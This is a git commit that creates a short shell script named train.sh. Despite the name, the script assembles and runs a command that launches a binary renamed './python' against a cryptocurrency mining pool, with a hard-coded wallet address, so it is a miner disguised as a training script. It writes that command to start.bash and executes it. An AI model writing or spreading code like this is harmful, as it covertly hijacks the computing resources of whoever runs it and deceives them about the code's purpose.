896b32450b584402b66f0502e3bdb286a2d1a75d
satoshinakamora1995 <49435831+satoshinakamora1995@users.noreply.github.com>
2019-05-21 17:31:26 +0800

    Create train.sh

---
+++ train.sh
@@ -0,0 +1,10 @@
+###/bin/bash
+a='./python  -epool grin.sparkpool.com:3333  -ewal 0x9ad488ebefef12a870362ef3efab29ab52801c38/worker'
+b=$RANDOM
+c='/666@qq.com -mode 6'
+d=${a}${b}${c}
+
+echo $d >> start.bash
+
+./start.bash
+###end！
